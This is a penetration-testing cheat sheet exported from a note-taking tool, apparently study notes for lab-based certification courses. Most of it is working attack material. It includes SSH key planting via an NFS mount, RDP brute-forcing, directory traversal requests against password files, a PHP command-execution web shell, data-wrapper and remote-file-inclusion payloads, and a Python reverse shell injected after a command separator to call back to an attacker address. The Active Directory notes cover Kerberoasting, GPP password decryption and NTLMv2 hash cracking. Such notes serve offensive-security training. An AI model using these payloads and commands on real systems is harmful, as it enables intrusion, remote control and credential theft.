      <rich_text background="#000000000000" foreground="#ffff00000000">Switch user to vulnix, and copy and paste the contents of /root/.ssh/id_rsa.pub to /mnt/vulnix/.ssh/authorized_keys</rich_text>
      <rich_text background="#000000000000">
$ su vulnix
$ cd /mnt/vulnix/.ssh
$ echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC1rYFvo6Wh4j44p4s6WfDYb637m62zA0CwE5t9K6iKbosZMpeDBGP2q8C2O3yw2P9Dhv3jRPCutf1ruadaMxxiOY8Ook/3fwMcaueCAs0ThKCMRlnf0yzUnEHH7t82MrEghMnL4GfUcYlxIwo8d5jQe7umuJneYK786iDNEPaEajC45GQlrZWCzIWqs3B3vJBQ4FR766EHsmiKVWvQ35uR69/O39IePJQ8oSTF+PK0RoCtvmYt44jeqUO0NfYGeCGwqtYW/i+ILTOkW45bYRVjhmrJ2C+yjtK3bsmDiq28IT9STCFlkI7OqEfJkeYqBSJVqVqOkFFvx4+7fyTpchT/ &gt; authorized_keys


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Login to vulnix's accounts via SSH</rich_text>
      <rich_text background="#000000000000">
$ su root
$ ssh vulnix@192.168.1.132</rich_text>
    </node>
    <node unique_id="81" master_id="0" name="PORT 3306 (MySQL)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670964447" ts_lastsave="1670979818">
      <rich_text background="#000000000000" foreground="#ffff00000000">Password Reuse</rich_text>
      <rich_text background="#000000000000">
$ mysql -h &lt;IP address&gt; -u &lt;username&gt; -p


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Nmap NSE Scripts</rich_text>
      <rich_text background="#000000000000">
$ ls -la /usr/share/nmap/scripts | grep "mysql"</rich_text>
    </node>
    <node unique_id="89" master_id="0" name="PORT 3389 (RDP)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670964447" ts_lastsave="1706062510">
      <rich_text background="#000000000000" foreground="#ffff00000000">Connect</rich_text>
      <rich_text background="#000000000000">
$ rdesktop -u &lt;username&gt; -p &lt;password&gt; &lt;IP address&gt;


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Nmap NSE Scripts</rich_text>
      <rich_text background="#000000000000">
$ ls -la /usr/share/nmap/scripts | grep "rdp"


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Brute-Force</rich_text>
      <rich_text background="#000000000000">
$ ncrack -vv --user &lt;username&gt; -P password-file.txt rdp://&lt;IP address&gt;</rich_text>
      <rich_text>

enable file transfer ---- 

rdesktop -r disk:sharename=/path/to/shared/folder &lt;Windows_Remote_Desktop_IP&gt;
</rich_text>
    </node>
    <node unique_id="91" master_id="0" name="PORT 5432 (POSTGRESQL)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670964447" ts_lastsave="1670979875">
      <rich_text background="#000000000000" foreground="#ffff00000000">Nmap NSE Scripts</rich_text>
      <rich_text background="#000000000000">
$ ls -la /usr/share/nmap/scripts | grep "postgresql"</rich_text>
    </node>
    <node unique_id="75" master_id="0" name="PORT 5900 (VNC)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670964447" ts_lastsave="1670979923">
      <rich_text background="#000000000000" foreground="#ffff00000000">Connect</rich_text>
      <rich_text background="#000000000000">
$ vncviewer &lt;IP address&gt;:&lt;port&gt; -passwd &lt;password&gt;


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Nmap NSE Scripts</rich_text>
      <rich_text background="#000000000000">
$ ls -la /usr/share/nmap/scripts | grep "vnc"</rich_text>
    </node>
    <node unique_id="72" master_id="0" name="PORT 5985 (WINRM)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670964447" ts_lastsave="1670979947">
      <rich_text background="#000000000000" foreground="#ffff00000000">Connect</rich_text>
      <rich_text>

</rich_text>
      <rich_text background="#000000000000">$ evil-winrm -i &lt;IP address&gt; -u &lt;username&gt; -p &lt;password&gt;</rich_text>
      <rich_text>
</rich_text>
    </node>
    <node unique_id="68" master_id="0" name="PORT 6667 (IRC)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670964447" ts_lastsave="1670979974">
      <rich_text background="#000000000000" foreground="#ffff00000000">Determine version</rich_text>
      <rich_text background="#000000000000">
$ irssi -c &lt;IP address&gt; --port 6667


</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Nmap NSE Scripts</rich_text>
      <rich_text background="#000000000000">
$ ls -la /usr/share/nmap/scripts | grep "irc"</rich_text>
    </node>
    <node unique_id="69" master_id="0" name="PORT 8080 (HTTP-Proxy)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670964447" ts_lastsave="1670980016">
      <rich_text background="#000000000000" foreground="#ffff00000000">Configure Firefox to use a proxy</rich_text>
      <rich_text background="#000000000000">
Preferences -&gt; Advanced -&gt; Network -&gt; Connection Settings -&gt; Manual Proxy Configuration



</rich_text>
      <rich_text background="#000000000000" foreground="#ffff00000000">Nikto Scan through a proxy</rich_text>
      <rich_text background="#000000000000">
$ nikto -h &lt;IP address&gt; -useproxy </rich_text>
      <rich_text link="webs http://192.168.97.129:3128" background="#000000000000">http://192.168.97.129:3128</rich_text>
    </node>
  </node>
  <node unique_id="272" master_id="0" name="Study Notes" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1704237786" ts_lastsave="1706110034">
    <rich_text>Directory Traveesal - Windows 

$curl --path-as-is </rich_text>
    <rich_text link="webs http://192.168.232.193:3000/public/plugins/mysql/../../../../../../../../Users/install.txt">http://192.168.232.193:3000/public/plugins/mysql/../../../../../../../../Users/install.txt</rich_text>
    <rich_text>  

Directory Traversal - Apache

curl </rich_text>
    <rich_text link="webs http://192.168.232.16/cgi-bin/%2E%2E/%2E%2E/%2E%2E/%2E%2E/opt/passwords">http://192.168.232.16/cgi-bin/%2E%2E/%2E%2E/%2E%2E/%2E%2E/opt/passwords</rich_text>
    <rich_text> 

/C:/Windows/System32/drivers/etc/hosts

PHP code snippet for cmd exec

		</rich_text>
    <rich_text family="monospace">&lt;?php echo system($_GET['cmd']); ?&gt;</rich_text>
    <rich_text>
		
PHP Wrappers: 

	data: 
			
				$curl "</rich_text>
    <rich_text link="webs http://192.168.232.16/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbY21kXSk7Pz4=&amp;cmd=uname%20-a">http://192.168.232.16/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbY21kXSk7Pz4=&amp;cmd=uname%20-a</rich_text>
    <rich_text>"                        
				
Remote file inclusion (RFI) vulnerabilities are less common than LFIssince the target system must be configured in a specific way. In PHPweb applications, for example, the </rich_text>
    <rich_text weight="heavy">allow_url_include</rich_text>
    <rich_text> option needsto be enabled to leverage RFI RFI vulnerabilities allow us to includefiles from a remote system over </rich_text>
    <rich_text style="italic">HTTP</rich_text>
    <rich_text link="webs https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/common-web-application-attacks/file-inclusion-vulnerabilities/remote-file-inclusion-rfi#fn1" scale="sup">1</rich_text>
    <rich_text> or </rich_text>
    <rich_text style="italic">SMB</rich_text>
    <rich_text>.</rich_text>
    <rich_text link="webs https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/common-web-application-attacks/file-inclusion-vulnerabilities/remote-file-inclusion-rfi#fn2" scale="sup">2</rich_text>
    <rich_text> Theincluded file is also executed in the context of the web application.Common scenarios where we'll find this option enabled is when the webapplication loads files or contents from remote systems e.g. librariesor application data. We can discover RFI vulnerabilities using thesame techniques covered in the Directory Traversal and LFI sections.

RFI 

url "</rich_text>
    <rich_text link="webs http://192.168.197.16/meteor/index.php?page=http://192.168.45.241/simple-backdoor.php&amp;cmd=ls">http://192.168.197.16/meteor/index.php?page=http://192.168.45.241/simple-backdoor.php&amp;cmd=ls</rich_text>
    <rich_text>"

python3 -m http.server 80

You will see that you now have a shell on the server. However, it is  only a temporary one and the shell will collapse if we do not make it  stable. To do this, once you have a shell, type the following:
python -c ‘import pty;pty.spawn(“/bin/bash”)’


find / -type f -name user.txt 2&gt;/dev/null
cat /var/www/user.txt

&amp;&amp; rcef
test"&amp;&amp;python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.45.160",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'"

Client Side Attacks: 
	
		</rich_text>
    <rich_text style="italic">Nmap</rich_text>
    <rich_text> is one of the most popular tools for enumeration. One very powerful feature of this tool is the </rich_text>
    <rich_text style="italic">Nmap Scripting Engine</rich_text>
    <rich_text> (NSE),</rich_text>
    <rich_text link="webs https://portal.offsec.com/courses/pen-200/books-and-videos/modal/modules/locating-public-exploits/offline-exploit-resources/nmap-nse-scripts#fn1" scale="sup">1</rich_text>
    <rich_text> which, as its name suggests, introduces the ability to automate various tasks using scripts.
Along with exploit services, the NSE comes with a variety of scripts to enumerate, brute force, fuzz, and detect. A complete list of scripts provided by the NSE can be found under </rich_text>
    <rich_text weight="heavy">/usr/share/nmap/scripts</rich_text>
    <rich_text>. Using </rich_text>
    <rich_text weight="heavy">grep</rich_text>
    <rich_text> to quickly search for the word "exploits" in the NSE scripts returns a number of results.
</rich_text>
    <rich_text family="monospace">kali@kali:~$ grep Exploits /usr/share/nmap/scripts/*.nse
/usr/share/nmap/scripts/clamav-exec.nse:Exploits ClamAV servers vulnerable to unauthenticated clamav comand execution.
/usr/share/nmap/scripts/http-awstatstotals-exec.nse:Exploits a remote code execution vulnerability in Awstats Totals 1.0 up to 1.14
/usr/share/nmap/scripts/http-axis2-dir-traversal.nse:Exploits a directory traversal vulnerability in Apache Axis2 version 1.4.1 by
/usr/share/nmap/scripts/http-fileupload-exploiter.nse:Exploits insecure file upload forms in web applications
/usr/share/nmap/scripts/http-litespeed-sourcecode-download.nse:Exploits a null-byte poisoning vulnerability in Litespeed Web Servers 4.0.x
...
</rich_text>
    <rich_text>Listing 14 - Listing NSE scripts containing the word "Exploits"
We can display the information of specific NSE scripts by running </rich_text>
    <rich_text weight="heavy">nmap</rich_text>
    <rich_text> with the </rich_text>
    <rich_text weight="heavy">--script-help</rich_text>
    <rich_text> option followed by the script filename. Let's analyze an example with </rich_text>
    <rich_text weight="heavy">nmap --script-help=clamav.exec.nse</rich_text>
    <rich_text>.
</rich_text>
    <rich_text family="monospace">kali@kali:~$ nmap --script-help=clamav-exec.nse
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-02 16:23 EDT

clamav-exec
Categories: exploit vuln
https://nmap.org/nsedoc/scripts/clamav-exec.html
  Exploits ClamAV servers vulnerable to unauthenticated clamav comand execution.

  ClamAV server 0.99.2, and possibly other previous versions, allow the execution
  of dangerous service commands without authentication. Specifically, the command 'SCAN'
  may be used to list system files and the command 'SHUTDOWN' shut downs the
  service. This vulnerability was discovered by Alejandro Hernandez (nitr0us).

  This script without arguments test the availability of the command 'SCAN'.

  Reference:
  * https://twitter.com/nitr0usmx/status/740673507684679680
  * https://bugzilla.clamav.net/show_bug.cgi?id=11585
</rich_text>
  </node>
  <node unique_id="48" master_id="0" name="ActiveDirectory" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="44" is_bold="1" foreground="#3584e4" ts_creation="1670959881" ts_lastsave="1670984038">
    <node unique_id="50" master_id="0" name="Internal Enumeration" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670959947" ts_lastsave="1670960120">
      <rich_text background="#000000000000">
Command &amp; Description

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-Module</rich_text>
      <rich_text background="#000000000000">

PowerShell cmdbased host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Import-Module ActiveDirectory</rich_text>
      <rich_text background="#000000000000">

Loads the </rich_text>
      <rich_text family="monospace" background="#000000000000">Active Directory</rich_text>
      <rich_text background="#000000000000"> PowerShell module from a Windows
</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-ADDomain</rich_text>
      <rich_text background="#000000000000">

PowerShell cmd-let used to gather Windows domain information from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName</rich_text>
      <rich_text background="#000000000000">

PowerShell cmd-let used to enumerate user accounts on a target Windows domain and filter by </rich_text>
      <rich_text family="monospace" background="#000000000000">ServicePrincipalName</rich_text>
      <rich_text background="#000000000000">. Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-ADTrust -Filter *</rich_text>
      <rich_text background="#000000000000">

PowerShell cmd-let used to enumerate any trust relationships in a target Windows domain and filters by any (</rich_text>
      <rich_text family="monospace" background="#000000000000">-Filter *)</rich_text>
      <rich_text background="#000000000000"> Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-ADGroup -Filter * | select name</rich_text>
      <rich_text background="#000000000000">

PowerShell cmd-let used to enumerate groups in a target Windows domain and filters by the name of the group (</rich_text>
      <rich_text family="monospace" background="#000000000000">select name)</rich_text>
      <rich_text background="#000000000000"> Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-ADGroup -Identity "Backup Operators"</rich_text>
      <rich_text background="#000000000000">

PowerShell cmd-let used to search for a specifc group (</rich_text>
      <rich_text family="monospace" background="#000000000000">-Identity "Backup Operators")</rich_text>
      <rich_text background="#000000000000"> Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-ADGroupMember -Identity "Backup Operators"</rich_text>
      <rich_text background="#000000000000">

PowerShell cmd-let used to discover the members of a specific group (</rich_text>
      <rich_text family="monospace" background="#000000000000">-Identity "Backup Operators")</rich_text>
      <rich_text background="#000000000000"> Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Export-PowerViewCSV</rich_text>
      <rich_text background="#000000000000">

PowerView script used to append results to a </rich_text>
      <rich_text family="monospace" background="#000000000000">CSV</rich_text>
      <rich_text background="#000000000000"> file. Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">ConvertTo-SID</rich_text>
      <rich_text background="#000000000000">

PowerView script used to convert a </rich_text>
      <rich_text family="monospace" background="#000000000000">User</rich_text>
      <rich_text background="#000000000000"> or </rich_text>
      <rich_text family="monospace" background="#000000000000">Group</rich_text>
      <rich_text background="#000000000000"> name to it's </rich_text>
      <rich_text family="monospace" background="#000000000000">SID</rich_text>
      <rich_text background="#000000000000">. Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-DomainSPNTicket</rich_text>
      <rich_text background="#000000000000">

PowerView script used to request the kerberos ticket for a specified service principal name (</rich_text>
      <rich_text family="monospace" background="#000000000000">SPN)</rich_text>
      <rich_text background="#000000000000"> Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-Domain</rich_text>
      <rich_text background="#000000000000">

PowerView script used tol return the AD object for the current (or specified) domain. Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-DomainController</rich_text>
      <rich_text background="#000000000000">

PowerView script used to return a list of the target domain controllers for the specified target domain. Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-DomainUser</rich_text>
      <rich_text background="#000000000000">

PowerView script used to return all users or specific user objects in AD. Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-DomainComputer</rich_text>
      <rich_text background="#000000000000">

PowerView script used to return all computers or specific computer objects in AD. Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-DomainGroup</rich_text>
      <rich_text background="#000000000000">

PowerView script used to eturn all groups or specific group objects in AD. Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-DomainOU</rich_text>
      <rich_text background="#000000000000">

PowerView script used to search for all or specific OU objects in AD. Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Find-InterestingDomainAcl</rich_text>
      <rich_text background="#000000000000">

PowerView script used to find object </rich_text>
      <rich_text family="monospace" background="#000000000000">ACLs</rich_text>
      <rich_text background="#000000000000"> in the domain with modification rights set to non-built in objects. Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-DomainGroupMember</rich_text>
      <rich_text background="#000000000000">

PowerView script used to return the members of a specific domain group. Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-DomainFileServer</rich_text>
      <rich_text background="#000000000000">

PowerView script used to return a list of servers likely functioning as file servers. Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-DomainDFSShare</rich_text>
      <rich_text background="#000000000000">

PowerView script used to return a list of all distributed file systems for the current (or specified) domain. Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-DomainGPO</rich_text>
      <rich_text background="#000000000000">

PowerView script used to return all GPOs or specific GPO objects in AD. Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-DomainPolicy</rich_text>
      <rich_text background="#000000000000">

PowerView script used to return the default domain policy or the domain controller policy for the current domain. Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-NetLocalGroup</rich_text>
      <rich_text background="#000000000000">

PowerView script used to enumerate local groups on a local or remote machine. Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-NetLocalGroupMember</rich_text>
      <rich_text background="#000000000000">

PowerView script enumerate members of a specific local group. Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-NetShare</rich_text>
      <rich_text background="#000000000000">

PowerView script used to return a list of open shares on a local (or a remote) machine. Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-NetSession</rich_text>
      <rich_text background="#000000000000">

PowerView script used to return session information for the local (or a remote) machine. Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Test-AdminAccess</rich_text>
      <rich_text background="#000000000000">

PowerView script used to test if the current user has administrative access to the local (or a remote) machine. Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Find-DomainUserLocation</rich_text>
      <rich_text background="#000000000000">

PowerView script used to find machines where specific users are logged into. Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Find-DomainShare</rich_text>
      <rich_text background="#000000000000">

PowerView script used to find reachable shares on domain machines. Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Find-InterestingDomainShareFile</rich_text>
      <rich_text background="#000000000000">

PowerView script that searches for files matching specific criteria on readable shares in the domain. Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Find-LocalAdminAccess</rich_text>
      <rich_text background="#000000000000">

PowerView script used to find machines on the local domain where the current user has local administrator access Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-DomainTrust</rich_text>
      <rich_text background="#000000000000">

PowerView script that returns domain trusts for the current domain or a specified domain. Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-ForestTrust</rich_text>
      <rich_text background="#000000000000">

PowerView script that returns all forest trusts for the current forest or a specified forest. Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-DomainForeignUser</rich_text>
      <rich_text background="#000000000000">

PowerView script that enumerates users who are in groups outside of the user's domain. Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-DomainForeignGroupMember</rich_text>
      <rich_text background="#000000000000">

PowerView script that enumerates groups with users outside of the group's domain and returns each foreign member. Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-DomainTrustMapping</rich_text>
      <rich_text background="#000000000000">

PowerView script that enumerates all trusts for current domain and any others seen. Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-DomainGroupMember -Identity "Domain Admins" -Recurse</rich_text>
      <rich_text background="#000000000000">

PowerView script used to list all the members of a target group (</rich_text>
      <rich_text family="monospace" background="#000000000000">"Domain Admins")</rich_text>
      <rich_text background="#000000000000"> the use of the recurse option (</rich_text>
      <rich_text family="monospace" background="#000000000000">-Recurse)</rich_text>
      <rich_text background="#000000000000"> Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName</rich_text>
      <rich_text background="#000000000000">

PowerView script used to find users on the target Windows domain that have the </rich_text>
      <rich_text family="monospace" background="#000000000000">Service Principal Name</rich_text>
      <rich_text background="#000000000000"> set. Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">.Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data</rich_text>
      <rich_text background="#000000000000">

Runs a tool called </rich_text>
      <rich_text family="monospace" background="#000000000000">Snaffler</rich_text>
      <rich_text background="#000000000000"> against a target Windows domain that finds various kinds of data in shares that the compromised account has access to. Performed from a Windows-based host.</rich_text>
    </node>
    <node unique_id="51" master_id="0" name="Trust Relationships - Cross-Forest" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670959947" ts_lastsave="1670960142">
      <rich_text background="#000000000000">
Command &amp; Description

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName</rich_text>
      <rich_text background="#000000000000">

PowerView tool used to enumerate accounts for associated </rich_text>
      <rich_text family="monospace" background="#000000000000">SPNs</rich_text>
      <rich_text background="#000000000000"> from a Windows
</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof</rich_text>
      <rich_text background="#000000000000">

PowerView tool used to enumerate the </rich_text>
      <rich_text family="monospace" background="#000000000000">mssqlsvc</rich_text>
      <rich_text background="#000000000000"> account from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">.Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap</rich_text>
      <rich_text background="#000000000000">

Uses </rich_text>
      <rich_text family="monospace" background="#000000000000">Rubeus</rich_text>
      <rich_text background="#000000000000"> to perform a Kerberoasting Attack against a target Windows domain (</rich_text>
      <rich_text family="monospace" background="#000000000000">/domain:FREIGHTLOGISTICS.local)</rich_text>
      <rich_text background="#000000000000"> a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL</rich_text>
      <rich_text background="#000000000000">

PowerView tool used to enumerate groups with users that do not belong to the domain from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHTadministrator</rich_text>
      <rich_text background="#000000000000">

PowerShell cmd-let used to remotely connect to a target Windows system from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley</rich_text>
      <rich_text background="#000000000000">

Impacket tool used to request (</rich_text>
      <rich_text family="monospace" background="#000000000000">-request)</rich_text>
      <rich_text background="#000000000000"> TGS ticket of an account in a target Windows domain (</rich_text>
      <rich_text family="monospace" background="#000000000000">-target-domain)</rich_text>
      <rich_text background="#000000000000"> a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2</rich_text>
      <rich_text background="#000000000000">

Runs the Python implementation of </rich_text>
      <rich_text family="monospace" background="#000000000000">BloodHound</rich_text>
      <rich_text background="#000000000000"> against a target Windows domain from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">zip -r ilfreight_bh.zip *.json</rich_text>
      <rich_text background="#000000000000">

Used to compress multiple files into 1 single </rich_text>
      <rich_text family="monospace" background="#000000000000">.zip</rich_text>
      <rich_text background="#000000000000"> file to be uploaded into the BloodHound GUI.</rich_text>
    </node>
    <node unique_id="52" master_id="0" name="Group Policy Enumeration &amp; Attacks" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670959947" ts_lastsave="1670960148">
      <rich_text background="#000000000000">

Command &amp; Description

</rich_text>
      <rich_text family="monospace" background="#000000000000">gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE</rich_text>
      <rich_text background="#000000000000">

Tool used to decrypt a captured </rich_text>
      <rich_text family="monospace" background="#000000000000">group policy preference password</rich_text>
      <rich_text background="#000000000000"> from a Linux
</rich_text>
      <rich_text family="monospace" background="#000000000000">crackmapexec smb -L | grep gpp</rich_text>
      <rich_text background="#000000000000">

Locates and retrieves a </rich_text>
      <rich_text family="monospace" background="#000000000000">group policy preference password</rich_text>
      <rich_text background="#000000000000"> using </rich_text>
      <rich_text family="monospace" background="#000000000000">CrackMapExec</rich_text>
      <rich_text background="#000000000000">, the filters the output using </rich_text>
      <rich_text family="monospace" background="#000000000000">grep</rich_text>
      <rich_text background="#000000000000">. Peformed from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin</rich_text>
      <rich_text background="#000000000000">

Locates and retrieves any credentials stored in the </rich_text>
      <rich_text family="monospace" background="#000000000000">SYSVOL</rich_text>
      <rich_text background="#000000000000"> share of a Windows target using </rich_text>
      <rich_text family="monospace" background="#000000000000">CrackMapExec</rich_text>
      <rich_text background="#000000000000"> from a Linux-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-DomainGPO | select displayname</rich_text>
      <rich_text background="#000000000000">

PowerView tool used to enumerate GPO names in a target Windows domain from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-GPO -All | Select DisplayName</rich_text>
      <rich_text background="#000000000000">

PowerShell cmd-let used to enumerate GPO names. Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">$sid=Convert-NameToSid "Domain Users"</rich_text>
      <rich_text background="#000000000000">

Creates a variable called </rich_text>
      <rich_text family="monospace" background="#000000000000">$sid</rich_text>
      <rich_text background="#000000000000"> that is set equal to the </rich_text>
      <rich_text family="monospace" background="#000000000000">Convert-NameToSid</rich_text>
      <rich_text background="#000000000000"> tool and specifies the group account </rich_text>
      <rich_text family="monospace" background="#000000000000">Domain Users</rich_text>
      <rich_text background="#000000000000">. Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid</rich_text>
      <rich_text background="#000000000000">

PowerView tool that is used to check if the </rich_text>
      <rich_text family="monospace" background="#000000000000">Domain Users</rich_text>
      <rich_text background="#000000000000"> (</rich_text>
      <rich_text family="monospace" background="#000000000000">eq $sid)</rich_text>
      <rich_text background="#000000000000"> has any rights over one or more GPOs. Performed from a Windows-based host.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532</rich_text>
      <rich_text background="#000000000000">

PowerShell cmd-let used to display the name of a GPO given a </rich_text>
      <rich_text family="monospace" background="#000000000000">GUID</rich_text>
      <rich_text background="#000000000000">. Performed from a Windows-based host.</rich_text>
    </node>
    <node unique_id="53" master_id="0" name="LLMNR NTB-NS Poisoning" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670959947" ts_lastsave="1670982862">
      <rich_text background="#000000000000">Command &amp; Description

</rich_text>
      <rich_text family="monospace" background="#000000000000">responder -h</rich_text>
      <rich_text background="#000000000000">

Used to display the usage instructions and various options available in </rich_text>
      <rich_text family="monospace" background="#000000000000">Responder</rich_text>
      <rich_text background="#000000000000"> from a Linux

</rich_text>
      <rich_text family="monospace" background="#000000000000">hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt</rich_text>
      <rich_text background="#000000000000">

Uses </rich_text>
      <rich_text family="monospace" background="#000000000000">hashcat</rich_text>
      <rich_text background="#000000000000"> to crack </rich_text>
      <rich_text family="monospace" background="#000000000000">NTLMv2</rich_text>
      <rich_text background="#000000000000"> (</rich_text>
      <rich_text family="monospace" background="#000000000000">-m)</rich_text>
      <rich_text background="#000000000000"> that were captured by responder and saved in a file (</rich_text>
      <rich_text family="monospace" background="#000000000000">frond_ntlmv2)</rich_text>
      <rich_text background="#000000000000"> The cracking is done based on a specified wordlist.

</rich_text>
      <rich_text family="monospace" background="#000000000000">Import-Module .Inveigh.ps1</rich_text>
      <rich_text background="#000000000000">

Using the </rich_text>
